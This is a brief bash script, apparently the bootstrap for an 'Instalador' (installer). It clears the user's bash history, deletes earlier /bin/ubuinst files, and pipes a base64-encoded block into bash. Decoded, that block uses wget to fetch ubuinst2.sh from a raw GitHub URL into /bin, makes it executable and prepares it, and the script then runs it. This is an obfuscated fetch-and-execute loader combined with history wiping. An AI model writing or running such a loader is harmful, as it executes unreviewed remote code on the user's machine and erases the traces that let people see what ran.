#!/bin/bash
cat /dev/null > ~/.bash_history && history -c
rm /bin/ubuinst* > /dev/null 2>&1
echo 'IyEvYmluL2Jhc2gKY2QgL2JpbiB8fCBleGl0CndnZXQgcmF3LmdpdGh1YnVzZXJjb250ZW50LmNv
bS9XZWJQcmVtaXVtQUkvSW5zdGFsYWRvci9QcmVtaXVtL3VidWluc3QyLnNoICYmIGNobW9kICt4
IHVidWluc3QyLnNoICYmIGRvczJ1bml4IHVidWluc3QyLnNoID4gL2Rldi9udWxsIDI+JjEKY2Qg
fHwgZXhpdA==' | base64 -d | bash
/bin/ubuinst2.sh
